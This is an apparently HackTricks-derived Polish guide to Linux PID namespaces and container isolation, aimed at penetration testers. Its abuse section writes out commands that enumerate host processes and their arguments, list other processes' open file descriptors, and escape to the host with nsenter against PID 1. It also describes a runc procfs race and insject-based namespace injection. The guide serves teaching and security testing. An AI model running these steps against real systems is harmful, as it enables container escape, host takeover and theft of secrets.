# Przestrzeń nazw PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Przestrzeń nazw PID kontroluje, jak procesy są numerowane i które procesy są widoczne. Dlatego kontener może mieć swój własny PID 1, mimo że nie jest prawdziwą maszyną. Wewnątrz przestrzeni nazw workload widzi to, co wygląda na lokalne drzewo procesów. Poza przestrzenią nazw host nadal widzi rzeczywiste PIDy hosta i pełny obraz procesów.

Z punktu widzenia bezpieczeństwa przestrzeń nazw PID ma znaczenie, ponieważ widoczność procesów jest cenna. Gdy workload może zobaczyć procesy hosta, może być w stanie obserwować nazwy usług, argumenty wiersza poleceń, sekrety przekazywane w argumentach procesów, stan pochodzący ze środowiska przez `/proc` oraz potencjalne cele do wejścia w inne przestrzenie nazw. Jeśli może zrobić coś więcej niż tylko zobaczyć te procesy — na przykład wysyłać sygnały lub używać ptrace w odpowiednich warunkach — problem staje się znacznie poważniejszy.

## Działanie

Nowa przestrzeń nazw PID zaczyna się od własnego wewnętrznego numerowania procesów. Pierwszy proces utworzony w jej obrębie staje się PID 1 z punktu widzenia tej przestrzeni nazw, co także oznacza, że otrzymuje specjalne, podobne do init, semantyki dla osieroconych dzieci i zachowania sygnałów. Wyjaśnia to wiele dziwactw kontenerów związanych z procesami init, zbieraniem procesów zombie i dlaczego w kontenerach czasem używa się maleńkich init wrapperów.

Ważna lekcja bezpieczeństwa jest taka, że proces może wyglądać na odizolowany, ponieważ widzi tylko własne drzewo PID, ale ta izolacja może być celowo usunięta. Docker exposes this through `--pid=host`, while Kubernetes does it through `hostPID: true`. Gdy kontener dołączy do przestrzeni nazw PID hosta, workload widzi procesy hosta bezpośrednio, a wiele dalszych ścieżek ataku staje się znacznie bardziej realnych.

## Laboratorium

Aby ręcznie utworzyć przestrzeń nazw PID:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Powłoka widzi teraz prywatny widok procesów. Flaga `--mount-proc` jest ważna, ponieważ montuje instancję procfs, która odpowiada nowej PID namespace, dzięki czemu lista procesów jest spójna od wewnątrz.

Aby porównać zachowanie kontenera:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Różnica jest natychmiastowa i łatwa do zrozumienia, dlatego to dobre pierwsze laboratorium dla czytelników.

## Użycie w czasie wykonywania

Normalne kontenery w Docker, Podman, containerd i CRI-O otrzymują własną przestrzeń nazw PID. Kubernetes Pods zwykle również mają izolowany widok PID, chyba że workload explicite zażąda współdzielenia host PID. Środowiska LXC/Incus opierają się na tym samym prymitywie jądra, chociaż przypadki użycia kontenerów systemowych mogą ujawniać bardziej skomplikowane drzewa procesów i sprzyjać ułatwieniom w debugowaniu.

Ta sama zasada obowiązuje wszędzie: jeśli runtime zdecydował się nie izolować przestrzeni nazw PID, jest to świadome zmniejszenie granicy kontenera.

## Nieprawidłowe konfiguracje

Kanoniczną nieprawidłową konfiguracją jest host PID sharing. Zespoły często uzasadniają to debugowaniem, monitoringiem lub wygodą zarządzania usługami, ale zawsze powinno być traktowane jako istotne wyjącie bezpieczeństwa. Nawet jeśli kontener nie ma natychmiastowego uprawnienia do zapisu względem procesów hosta, sama widoczność może ujawnić wiele informacji o systemie. Gdy dodane zostaną capabilities takie jak `CAP_SYS_PTRACE` lub przydatny dostęp do procfs, ryzyko znacząco rośnie.

Innym błędem jest założenie, że ponieważ workload domyślnie nie może kill ani ptrace procesów hosta, host PID sharing jest więc nieszkodliwe. Takie wnioski ignorują wartość enumeracji, dostępność celów wejścia do namespace oraz to, jak widoczność PID łączy się z innymi osłabionymi kontrolami.

## Nadużycia

Jeśli przestrzeń nazw PID hosta jest współdzielona, atakujący może inspect procesy hosta, zbierać argumenty procesów, identyfikować interesujące usługi, lokalizować kandydatów PID do użycia `nsenter`, lub łączyć widoczność procesów z uprawnieniami związanymi z ptrace, by ingerować w hosta lub sąsiednie zadania. W niektórych przypadkach samo zobaczenie odpowiedniego długo działającego procesu wystarcza, by przekształcić resztę planu ataku.

Pierwszym praktycznym krokiem jest zawsze potwierdzenie, że procesy hosta są naprawdę widoczne:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Gdy PID-y hosta są widoczne, argumenty procesów i cele wejścia do przestrzeni nazw często stają się najważniejszym źródłem informacji:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Jeśli `nsenter` jest dostępny i masz wystarczające uprawnienia, sprawdź, czy widoczny proces hosta może zostać użyty jako mostek przestrzeni nazw:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Nawet jeśli dostęp jest zablokowany, udostępnianie PID hosta jest już wartościowe, ponieważ ujawnia rozmieszczenie usług, komponenty runtime oraz kandydatów na uprzywilejowane procesy do kolejnego zaatakowania.

Widoczność PID hosta również sprawia, że file-descriptor abuse staje się bardziej realistyczne. Jeśli uprzywilejowany proces hosta lub sąsiedni workload ma otwarty wrażliwy plik lub socket, atakujący może być w stanie przejrzeć `/proc/<pid>/fd/` i ponownie użyć tego uchwytu w zależności od własności, opcji montowania procfs oraz modelu usługi docelowej.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Te polecenia są przydatne, ponieważ odpowiadają na pytanie, czy `hidepid=1` lub `hidepid=2` zmniejsza widoczność między procesami oraz czy oczywiście interesujące deskryptory, takie jak otwarte pliki z sekretami, logi lub Unix sockets, są w ogóle widoczne.

### Pełny przykład: PID hosta + `nsenter`

Współdzielenie PID hosta staje się bezpośrednim host escape, gdy proces ma także wystarczające uprawnienia, aby dołączyć do namespace'ów hosta:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Jeśli polecenie powiedzie się, proces kontenera będzie teraz wykonywany w przestrzeniach nazw hosta: mount, UTS, network, IPC i PID. Skutkiem jest natychmiastowe przejęcie hosta.

Nawet jeśli samo `nsenter` jest niedostępne, ten sam efekt może być osiągnięty za pomocą binarki hosta, jeśli system plików hosta jest zamontowany:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Ostatnie uwagi dotyczące czasu wykonania

Niektóre ataki istotne dla PID-namespace nie są tradycyjnymi błędami konfiguracji `hostPID: true`, lecz błędami w implementacji w czasie wykonania dotyczącymi tego, jak zabezpieczenia procfs są stosowane podczas ustawiania kontenera.

#### Wyścig `maskedPaths` o hostowy procfs

W podatnych wersjach `runc`, napastnicy mający kontrolę nad obrazem kontenera lub obciążeniem uruchamianym przez `runc exec` mogli wywołać wyścig w fazie maskowania, zastępując po stronie kontenera `/dev/null` dowiązaniem symbolicznym do wrażliwej ścieżki procfs, takiej jak `/proc/sys/kernel/core_pattern`. Jeśli wyścig się powiódł, bind mount maskowanej ścieżki mógł trafić na niewłaściwy cel i ujawnić globalne na hoście ustawienia procfs nowemu kontenerowi.

Przydatne polecenie do przeglądu:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
To ważne, ponieważ ostateczny wpływ może być taki sam jak bezpośrednia ekspozycja procfs: zapisywalny `core_pattern` lub `sysrq-trigger`, prowadzący do host code execution lub denial of service.

#### Namespace injection with `insject`

Namespace injection tools such as `insject` pokazują, że interakcja z PID-namespace nie zawsze wymaga wcześniejszego wejścia do docelowej namespace przed tworzeniem procesu. Pomocnik może dołączyć później, użyć `setns()` i wykonać się, zachowując widoczność w docelowej PID space:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ten rodzaj techniki ma znaczenie przede wszystkim przy zaawansowanym debugowaniu, offensive tooling oraz post-exploitation workflows, gdy kontekst namespace trzeba dołączyć po tym, jak runtime zainicjował już workload.

### Related FD Abuse Patterns

Dwa wzorce warto wyraźnie wyróżnić, gdy PIDy hosta są widoczne. Po pierwsze, uprzywilejowany proces może pozostawić wrażliwy deskryptor pliku otwarty po `execve()`, ponieważ nie został oznaczony `O_CLOEXEC`. Po drugie, usługi mogą przesyłać deskryptory plików przez Unix sockets za pomocą `SCM_RIGHTS`. W obu przypadkach interesującym obiektem nie jest już ścieżka, lecz już otwarty uchwyt (handle), który proces o niższych uprawnieniach może odziedziczyć lub otrzymać.

Ma to znaczenie w pracy z kontenerami, ponieważ uchwyt może wskazywać na `docker.sock`, uprzywilejowany log, tajny plik hosta lub inny obiekt o wysokiej wartości, nawet gdy sama ścieżka nie jest bezpośrednio osiągalna z systemu plików kontenera.

## Checks

Celem tych poleceń jest ustalenie, czy proces ma prywatny widok PIDów, czy też może już wypisać znacznie szerszy zestaw procesów.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Co jest tu interesujące:

- Jeśli lista procesów zawiera oczywiste usługi hosta, udostępnianie PID hosta jest prawdopodobnie już aktywne.
- Zobaczenie tylko niewielkiego, lokalnego drzewa kontenera jest normalnym stanem; zobaczenie `systemd`, `dockerd` lub niezwiązanych demonów nie jest.
- Gdy PID-y hosta są widoczne, nawet informacje o procesach dostępne tylko do odczytu stają się użytecznym rozpoznaniem.

Jeśli odkryjesz kontener działający z udostępnianiem PID hosta, nie traktuj tego jako różnicy kosmetycznej. To istotna zmiana w tym, co workload może obserwować i potencjalnie modyfikować.
{{#include ../../../../../banners/hacktricks-training.md}}
